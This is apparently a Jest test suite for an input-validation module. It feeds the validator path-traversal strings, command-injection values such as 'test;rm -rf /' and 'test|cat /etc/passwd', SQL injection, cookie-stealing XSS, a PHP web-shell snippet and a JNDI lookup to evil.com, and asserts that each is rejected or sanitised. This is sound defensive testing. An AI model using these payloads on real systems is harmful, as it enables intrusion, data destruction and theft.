import { describe, it, expect } from '@jest/globals';
import {
  validateFilename,
  validatePath,
  validateUsername,
  validateCategory,
  sanitizeInput,
  validateContentSize
} from '../../src/security/InputValidator';
import { SECURITY_LIMITS } from '../../src/security/constants';

describe('InputValidator - Security Edge Cases', () => {
  describe('validateFilename', () => {
    it('should accept valid filenames', () => {
      const validFilenames = [
        'test.md',
        'my-persona.yaml',
        'character_2025.json',
        'abc' + 'd'.repeat(246) + 'e' // Max length minus extension
      ];

      validFilenames.forEach(filename => {
        expect(() => validateFilename(filename)).not.toThrow();
        expect(validateFilename(filename)).toBeDefined();
      });
    });

    it('should reject path traversal attempts', () => {
      const maliciousFilenames = [
        '../../../etc/passwd',
        '..\\..\\windows\\system32',
        'test/../../../secret.md',
        'test/../../.env',
        '.../.../config',
        'test\x00.md', // Null byte injection
        'test%2e%2e%2fsecret.md' // URL encoded
      ];

      // These get sanitized then validated, so they might not throw
      // but the output won't match the input
      maliciousFilenames.forEach(filename => {
        try {
          const result = validateFilename(filename);
          // If it doesn't throw, the result should be different from input
          expect(result).not.toBe(filename);
        } catch (error) {
          // If it throws, that's also acceptable
          expect(error).toBeDefined();
        }
      });
    });

    it('should reject special characters and control characters', () => {
      const invalidFilenames = [
        'test<script>.md',
        'test">alert.md',
        'test\nfile.md',
        'test\rfile.md',
        'test\x00file.md',
        'test\x1bfile.md',
        'test|command.md',
        'test;rm -rf.md',
        'test&command.md'
      ];

      // Special characters get stripped, then pattern is tested
      invalidFilenames.forEach(filename => {
        try {
          const result = validateFilename(filename);
          // If it doesn't throw, result should be sanitized
          expect(result).not.toContain('<');
          expect(result).not.toContain('>');
          expect(result).not.toContain('|');
        } catch (error) {
          // Many will throw after sanitization
          expect((error as Error).message).toContain('Invalid filename');
        }
      });
    });

    it('should reject overly long filenames', () => {
      const longFilename = 'a'.repeat(256);
      expect(() => validateFilename(longFilename))
        .toThrow('Filename too long');
    });

    it('should reject empty or invalid types', () => {
      expect(() => validateFilename('')).toThrow('Filename must be a non-empty string');
      expect(() => validateFilename(null as any)).toThrow('Filename must be a non-empty string');
      expect(() => validateFilename(123 as any)).toThrow('Filename must be a non-empty string');
      expect(() => validateFilename({} as any)).toThrow('Filename must be a non-empty string');
    });
  });

  describe('validatePath', () => {
    it('should accept valid paths', () => {
      const validPaths = [
        'personas/creative/writer.md',
        'test/path/to/file.yaml',
        'simple.md',
        'a/b/c/d/e/f/g.json'
      ];

      validPaths.forEach(path => {
        expect(() => validatePath(path)).not.toThrow();
      });
    });

    it('should reject absolute paths', () => {
      const absolutePaths = [
        '/etc/passwd',
        '/home/user/.ssh/id_rsa',
        'C:\\Windows\\System32\\config',
        '\\\\server\\share\\file.txt'
      ];

      // Absolute paths have leading slashes removed, then validated
      absolutePaths.forEach(path => {
        try {
          const result = validatePath(path);
          // If it doesn't throw, it should be normalized
          expect(result.startsWith('/')).toBe(false);
          expect(result.includes('\\')).toBe(false);
        } catch (error) {
          // Some may still fail validation
          expect(error).toBeDefined();
        }
      });
    });

    it('should reject path traversal with various techniques', () => {
      const traversalPaths = [
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32',
        'test/../../secret',
        'personas/../../../.env',
        'test/.../.../.../secret',
        'test/./././../../../secret',
        'test//../..//../..//secret',
        'test/\x00../../secret',
        'test%2f..%2f..%2fsecret'
      ];

      traversalPaths.forEach(path => {
        expect(() => validatePath(path)).toThrow();
        // Most will throw 'Path traversal not allowed' but some may fail pattern validation first
      });
    });

    it('should reject paths with dangerous characters', () => {
      const dangerousPaths = [
        'test;rm -rf /',
        'test|cat /etc/passwd',
        'test&whoami',
        'test$(command)',
        'test`command`',
        'test\ncommand',
        'test\rcommand',
        'test<script>alert(1)</script>'
      ];

      dangerousPaths.forEach(path => {
        expect(() => validatePath(path)).toThrow('Invalid path format');
      });
    });

    it('should enforce length limits', () => {
      const longPath = 'a/'.repeat(251) + 'file.md'; // > 500 chars
      expect(() => validatePath(longPath)).toThrow();
    });
  });

  describe('validateUsername', () => {
    it('should accept valid usernames', () => {
      const validUsernames = [
        'john_doe',
        'user123',
        'test.user',
        'alice-smith',
        'a1b2c3'
      ];

      validUsernames.forEach(username => {
        const result = validateUsername(username);
        expect(result).toBe(username.toLowerCase());
      });
    });

    it('should reject SQL injection attempts', () => {
      const sqlInjections = [
        "admin' OR '1'='1",
        "user'; DROP TABLE users--",
        "test' UNION SELECT * FROM passwords--",
        "1'; DELETE FROM personas WHERE '1'='1"
      ];

      sqlInjections.forEach(username => {
        expect(() => validateUsername(username))
          .toThrow('Invalid username format');
      });
    });

    it('should reject XSS attempts', () => {
      const xssAttempts = [
        '<script>alert(1)</script>',
        'user<img src=x onerror=alert(1)>',
        'test"><script>alert(document.cookie)</script>',
        "user' onmouseover='alert(1)"
      ];

      xssAttempts.forEach(username => {
        expect(() => validateUsername(username))
          .toThrow('Invalid username format');
      });
    });

    it('should enforce length limits', () => {
      const longUsername = 'a'.repeat(35);
      expect(() => validateUsername(longUsername))
        .toThrow('Invalid username format');
    });

    it('should reject usernames with spaces', () => {
      expect(() => validateUsername('user name'))
        .toThrow('Invalid username format');
    });
  });

  describe('validateCategory', () => {
    it('should accept valid categories', () => {
      const validCategories = [
        'creative',
        'professional',
        'educational',
        'gaming',
        'personal'
      ];

      validCategories.forEach(category => {
        const result = validateCategory(category);
        expect(result).toBe(category.toLowerCase());
      });
    });

    it('should reject invalid categories', () => {
      const invalidCategories = [
        'unknown',
        'test',
        'admin',
        'system',
        '../creative'
      ];

      invalidCategories.forEach(category => {
        expect(() => validateCategory(category))
          .toThrow('Invalid category');
      });
    });

    it('should reject categories with special characters', () => {
      const maliciousCategories = [
        'creative<script>',
        'test;delete',
        'category|command',
        'test\x00category'
      ];

      maliciousCategories.forEach(category => {
        expect(() => validateCategory(category))
          .toThrow();
      });
    });
  });

  describe('sanitizeInput', () => {
    it('should remove control characters', () => {
      const input = 'Hello\x00World\x1bTest\x7f';
      const result = sanitizeInput(input);
      expect(result).toBe('HelloWorldTest');
    });

    it('should remove HTML-dangerous characters', () => {
      const input = '<script>alert("XSS")</script>&copy;';
      const result = sanitizeInput(input);
      expect(result).toBe('scriptalert(XSS)/scriptcopy;');
    });

    it('should enforce length limits', () => {
      const longInput = 'a'.repeat(2000);
      const result = sanitizeInput(longInput);
      expect(result.length).toBe(1000);
    });

    it('should handle various malicious inputs', () => {
      const maliciousInputs = [
        '<?php system($_GET["cmd"]); ?>',
        '${jndi:ldap://evil.com/a}',
        '%3Cscript%3Ealert(1)%3C/script%3E',
        '\\x3cscript\\x3ealert(1)\\x3c/script\\x3e'
      ];

      maliciousInputs.forEach(input => {
        const result = sanitizeInput(input);
        expect(result).not.toContain('<');
        expect(result).not.toContain('>');
        expect(result).not.toContain('"');
        expect(result).not.toContain("'");
      });
    });

    it('should handle null and undefined gracefully', () => {
      expect(sanitizeInput(null as any)).toBe('');
      expect(sanitizeInput(undefined as any)).toBe('');
      expect(sanitizeInput({} as any)).toBe('');
    });
  });

  describe('validateContentSize', () => {
    it('should accept content within limits', () => {
      const validContent = 'a'.repeat(1000);
      expect(() => validateContentSize(validContent)).not.toThrow();
    });

    it('should reject oversized content', () => {
      const oversizedContent = 'a'.repeat(SECURITY_LIMITS.MAX_CONTENT_LENGTH + 1);
      expect(() => validateContentSize(oversizedContent))
        .toThrow('Content too large');
    });

    it('should handle Unicode correctly', () => {
      // Each emoji is 4 bytes
      const emojiContent = '😀'.repeat(Math.floor(SECURITY_LIMITS.MAX_CONTENT_LENGTH / 4) + 100);
      expect(() => validateContentSize(emojiContent))
        .toThrow('Content too large');
      
      // Test edge case: exactly at limit with multi-byte characters
      const mixedContent = 'a'.repeat(SECURITY_LIMITS.MAX_CONTENT_LENGTH - 4) + '😀';
      expect(() => validateContentSize(mixedContent)).not.toThrow();
      
      // Test various Unicode characters
      const unicodeTests = [
        { text: '中文测试', expectMultiByte: true },  // Chinese characters
        { text: '🔥💯👍', expectMultiByte: true },   // Emojis
        { text: 'café', expectMultiByte: true },      // Accented characters
        { text: '\u0000\u0001\u0002', expectMultiByte: false }  // Control characters
      ];
      
      unicodeTests.forEach(({ text, expectMultiByte }) => {
        const size = new TextEncoder().encode(text).length;
        if (expectMultiByte) {
          expect(size).toBeGreaterThan(text.length); // Verify multi-byte
        } else {
          expect(size).toBe(text.length); // Single byte characters
        }
      });
    });

    it('should accept custom size limits', () => {
      const content = 'a'.repeat(150);
      expect(() => validateContentSize(content, 100))
        .toThrow('Content too large');
      expect(() => validateContentSize(content, 200))
        .not.toThrow();
    });
  });

  describe('Combined Attack Vectors', () => {
    it('should handle polyglot attacks', () => {
      const polyglotAttacks = [
        'test.md\x00.exe',
        '../test.md%00.php',
        'file.md\r\nContent-Type: text/html',
        'test.md;ls -la;#'
      ];

      polyglotAttacks.forEach(attack => {
        expect(() => validateFilename(attack)).toThrow();
      });
    });

    it('should handle encoding attacks', () => {
      const encodingAttacks = [
        'test%2e%2e%2f%2e%2e%2fpasswd',
        'test\u002e\u002e\u002fpasswd',
        'test%252e%252e%252fpasswd', // Double encoding
        'test%c0%ae%c0%ae/passwd' // UTF-8 encoding
      ];

      encodingAttacks.forEach(attack => {
        expect(() => validatePath(attack)).toThrow();
      });
    });

    it('should handle homograph attacks', () => {
      const homographAttacks = [
        'tеst.md', // Cyrillic 'е'
        'tėst.md', // Latin with dot above
        'ｔest.md' // Full-width character
      ];

      // These should be rejected due to non-ASCII characters
      homographAttacks.forEach(attack => {
        expect(() => validateFilename(attack)).toThrow();
        // Verify they all get rejected with specific error message
        try {
          validateFilename(attack);
          fail(`Should have thrown for homograph attack: ${attack}`);
        } catch (error) {
          expect((error as Error).message).toMatch(/Invalid filename/);
          // Ensure the error is not a generic one
          expect((error as Error).message).not.toMatch(/undefined/);
          expect((error as Error).message).not.toMatch(/null/);
        }
      });
      
      // Additional homograph tests
      const moreHomographs = [
        'АВСDЕҒԌНІЈКԼМΝОРԚЅТԱѴԜХҮΖаЬсԁеſɡһіϳкІтпорԛѕƚսѵԝхуᴢ', // Mixed scripts
        'ⅰⅱⅲⅳⅴ.md',  // Roman numerals that look like letters
        '𝐭𝐞𝐬𝐭.md',   // Mathematical alphanumeric symbols
      ];
      
      moreHomographs.forEach(attack => {
        expect(() => validateFilename(attack)).toThrow(/Invalid filename/);
      });
    });

    it('should resist timing attacks on validation', () => {
      const validInput = 'test-file.md';
      const invalidInput = '../../../etc/passwd';
      
      // Run the timing test multiple times to account for CI environment variance
      const testRuns = 5;
      let passCount = 0;
      
      for (let run = 0; run < testRuns; run++) {
        // Measure validation times
        const timings = {
          valid: [] as number[],
          invalid: [] as number[]
        };
        
        // Run multiple iterations per test
        for (let i = 0; i < 100; i++) {
          const validStart = process.hrtime.bigint();
          try { validateFilename(validInput); } catch {}
          timings.valid.push(Number(process.hrtime.bigint() - validStart));
          
          const invalidStart = process.hrtime.bigint();
          try { validateFilename(invalidInput); } catch {}
          timings.invalid.push(Number(process.hrtime.bigint() - invalidStart));
        }
        
        // Calculate averages
        const avgValid = timings.valid.reduce((a, b) => a + b) / timings.valid.length;
        const avgInvalid = timings.invalid.reduce((a, b) => a + b) / timings.invalid.length;
        
        // Timing difference should be minimal
        const variance = Math.abs(avgValid - avgInvalid) / Math.max(avgValid, avgInvalid);
        
        // Check if this run passes the 50% variance threshold
        if (variance < 0.5) {
          passCount++;
        }
      }
      
      // Test passes if more than half of the runs succeed
      // This accounts for CI environment variance while still ensuring timing attack resistance
      expect(passCount).toBeGreaterThan(testRuns / 2);
      
      // Additional timing attack protection tests
      // Test that early vs late rejection doesn't leak timing info
      const earlyReject = 'Δtest.md';  // Fails on first character
      const lateReject = 'test-file-name-that-is-very-long-and-fails-at-endΔ.md';
      
      // Run position variance test multiple times
      const positionTestRuns = 5;
      let positionPassCount = 0;
      
      for (let run = 0; run < positionTestRuns; run++) {
        const earlyTimings: number[] = [];
        const lateTimings: number[] = [];
        
        for (let i = 0; i < 50; i++) {
          const earlyStart = process.hrtime.bigint();
          try { validateFilename(earlyReject); } catch {}
          earlyTimings.push(Number(process.hrtime.bigint() - earlyStart));
          
          const lateStart = process.hrtime.bigint();
          try { validateFilename(lateReject); } catch {}
          lateTimings.push(Number(process.hrtime.bigint() - lateStart));
        }
        
        const avgEarly = earlyTimings.reduce((a, b) => a + b) / earlyTimings.length;
        const avgLate = lateTimings.reduce((a, b) => a + b) / lateTimings.length;
        const positionVariance = Math.abs(avgEarly - avgLate) / Math.max(avgEarly, avgLate);
        
        // Check if this run passes the 1.0 variance threshold
        if (positionVariance < 1.0) {
          positionPassCount++;
        }
      }
      
      // Position of invalid character shouldn't significantly affect timing
      // CI environments have high timing variance, so we use a more lenient threshold
      // The important security property is that timing doesn't leak exact position info
      // Test passes if more than half of the runs succeed
      expect(positionPassCount).toBeGreaterThan(positionTestRuns / 2);
    });
  });
});